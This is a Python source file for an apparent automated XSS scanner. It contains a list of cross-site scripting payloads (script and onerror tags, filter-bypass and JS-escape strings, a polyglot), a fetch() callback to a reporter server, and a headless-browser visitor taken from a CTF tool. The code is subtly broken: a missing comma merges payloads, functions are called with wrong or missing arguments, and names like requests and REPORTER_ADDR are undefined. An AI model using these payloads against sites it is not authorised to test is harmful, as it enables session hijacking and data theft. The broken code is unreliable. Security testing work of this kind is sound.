import logging
import asyncio
from arsenic import get_session, services, browsers

XSS_PAYLOADS = [
    # Basic payloads
    "<script>%s</script>",
    '>"<script>%s</script>',
    "<img src=a onerror=%s>",
    '>"<img src=a onerror=%s>',
    "<svg/onload=%s>",
    "javascript:%s",
    # .lower() sanitation check
    "<scrİpt>%s</scrİpt>"
    # Recursive filter checks
    "<scri<script>pt>%s</scr</script>ipt>",
    "<scri<script>pt>%s</script>",
    # Template injection
    '{{ "<script>%s</script>" }}',
    # JS Escape payloads
    '";%s;//',
    "';%s;//",
    "');%s;//",
    '")%s;//',
    "')%s;//",
    "}]};%s//\\",
    "\\x3cscript\\x3e%s\\x3c\\x2fscript\\x3e",
    # Polyglot
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+%s//'>",
]


def build_callback_url(callback_id, sid):
    payload = 'fetch("%s/cb?sid=%d&tid=%d")' % (REPORTER_ADDR, sid, callback_id)
    return payload


# Taken from github.com/osirislab/ctf-browser-visitor
async def visit(config):
    service = services.Geckodriver()
    browser = browsers.Firefox(**{"moz:firefoxOptions": {"args": ["-headless"]}})

    logging.info("Hitting url " + config["url"])
    try:
        async with get_session(service, browser) as session:
            await session.delete_all_cookies()
            await session.get(config["url"])

            for k, c in config.get("cookies", {}).items():
                value = c.get("value", "")
                domain = c.get("domain", None)
                path = c.get("path", "/")
                secure = c.get("secure", False)
                await session.add_cookie(
                    k, value, path=path, domain=domain, secure=secure
                )

            await session.get(config["url"])
    except Exception as e:
        logging.info(
            "Exception hitting url " + str(config) + " with exception " + e.message
        )


async def inquisition(
    sid,
    payload_url,
    payload_method="GET",
    payload_data={},
    payload_cookies={},
    check_url=None,
    check_cookies={},
):
    """ 
    :param payload_url: URL to send payloads to
    :param payload_method: HTTP method to send payloads with
    """
    if not check_url:
        check_url = payload_url

    for payload in XSS_PAYLOADS:
        payload_f = build_callback_url()
        r = requests.request(
            payload_method, payload_url, data=payload_data, cookies=payload_cookies
        )
        if not r.ok:
            logging.info(
                "Request failed for site '%s' with payload %s" % (payload_url, payload)
            )
            continue

        config = {"cookies": check_cookies, "url": check_url}
        await visit(check_url)
